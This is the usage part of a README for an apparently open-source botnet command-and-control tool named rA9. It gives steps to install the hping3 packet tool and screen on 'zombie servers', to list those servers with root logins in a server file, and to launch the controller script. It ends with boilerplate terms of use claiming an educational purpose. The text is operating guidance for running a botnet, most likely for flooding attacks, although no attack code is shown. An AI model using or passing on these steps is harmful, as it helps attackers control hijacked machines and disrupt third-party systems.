# Usage:
- Install 'hping3' for all zombie server (This feature will come later.)
	-For Ubuntu servers:
	`sudo apt-get update` <br>
	`sudo apt-get install hping3`
> For CentOS servers:
`yum install epel-release`
`yum install hping3`

- Install 'screen' for all zombie server (This feature will come later.)

> For Ubuntu servers:
`sudo apt-get update`
`sudo apt-get install screen`

> For CentOS servers:
`yum -y install screen`

- Install the requirements.txt
`pip install -r requirements.txt `

- Import server list into 'serverList' file like this syntax. (Zombie servers must be root user)
`127.0.0.1:root:1234`

- Run rA9 botnet C&C.
`python3 rA9.py`


# Terms Of Use
1. Do NOT use this on any computer you do not own, or are not allowed to run this on.
2. You may NEVER attempt to sell this, its free and open source.
3. The authors and publishers assume no responsibility.
4. For educational purposes only.